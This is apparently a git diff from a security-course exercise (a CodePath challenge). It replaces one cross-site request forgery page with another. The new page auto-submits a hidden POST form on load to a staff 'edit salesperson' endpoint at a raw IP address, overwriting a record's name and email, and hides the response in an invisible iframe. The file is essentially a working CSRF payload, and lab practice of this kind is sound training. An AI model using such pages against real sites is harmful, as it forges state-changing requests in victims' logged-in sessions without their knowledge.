@@ -1,9 +1,14 @@
 <html>
-<body>
-<form name="csrfForm" action="https://security.codepath.com/user/csrfchallengetwo/plusplus" method="POST">
- <input type="hidden" name="userId" value="d6b492e3bab4ec4f7e26f48876157bb2c6926fb8"/>
- <input type="hidden" type="submit"/>
-</form>
-<script>document.csrfForm.submit();</script>
-</body>
+  <head>
+    <title>Edit Sales</title>
+  </head>
+  <body onload="document.edit_sales_form.submit()">
+    <form action="https://35.184.88.145/red/public/staff/salespeople/edit.php?id=5" method="POST" name="edit_sales_form" style="display: none;" target="hidden_results" >
+	<input type="text" name="first_name" value="Russell" /><br />
+    <input type="text" name="last_name" value="none" /><br />
+    <input type="text" name="email" value="AngrySloth@as.com" /><br />
+    <input type="hidden" type="submit"/>
+    </form>
+    <iframe name="hidden_results" style="display: none;"></iframe>
+  </body>
 </html>
